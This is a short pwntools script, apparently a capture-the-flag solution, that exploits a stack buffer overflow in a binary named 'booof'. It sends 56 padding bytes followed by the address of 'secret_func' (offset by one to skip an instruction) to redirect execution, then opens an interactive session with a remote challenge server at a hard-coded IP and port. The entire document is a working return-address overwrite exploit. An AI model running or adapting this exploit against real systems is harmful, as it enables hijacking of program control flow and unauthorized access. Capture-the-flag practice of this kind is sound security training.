from pwn import *

local = False
elf = ELF('./booof')

if local:
    io = elf.process()
else:
    io = remote("68.183.110.11", 2002)


secret_func = 0x0000000000401157 

pld = b""
pld += b"A"*56
pld += p64(elf.sym['secret_func'] + 1) # I had to add to skip the first instruction for the exploit to work


io.sendline(pld)
io.interactive()
